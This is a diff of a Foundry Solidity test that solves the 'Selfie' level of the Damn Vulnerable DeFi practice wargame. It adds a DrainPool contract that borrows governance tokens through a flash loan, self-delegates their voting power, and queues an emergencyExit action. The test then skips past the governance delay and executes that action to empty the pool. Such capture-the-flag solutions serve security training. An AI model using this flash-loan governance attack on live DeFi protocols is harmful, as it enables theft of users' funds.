@@ -6,6 +6,44 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+contract DrainPool is IERC3156FlashBorrower{
+
+      bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+      DamnValuableVotes public immutable token;
+      SimpleGovernance public immutable governance;
+      SelfiePool public immutable pool;
+
+      constructor(DamnValuableVotes _token,SimpleGovernance _governance,SelfiePool _pool){
+        token = _token;
+        governance = _governance;
+        pool = _pool;
+      }
+
+      function flashLoan(uint256 _amount, bytes calldata _data) external {
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), _amount, _data);
+      }
+
+       function onFlashLoan(
+        address ,
+        address ,
+        uint256 _amount,
+        uint256 _fee,
+        bytes calldata _data
+    ) external override returns (bytes32) {
+
+
+        token.delegate(address(this));
+        governance.queueAction(address(pool), uint128(0), _data);
+
+        token.approve(address(pool), _amount + _fee);
+
+        return CALLBACK_SUCCESS;
+    }
+
+    
+}
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -61,7 +99,15 @@ contract SelfieChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_selfie() public checkSolvedByPlayer {}
+    function test_selfie() public checkSolvedByPlayer {
+        DrainPool drainPool = new DrainPool(token,governance,pool);
+        bytes memory data = abi.encodeWithSelector(SelfiePool.emergencyExit.selector,recovery);        
+        drainPool.flashLoan(TOKENS_IN_POOL,data);
+
+        vm.warp(block.timestamp + governance.getActionDelay()+ 2 hours);
+
+        governance.executeAction(1);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
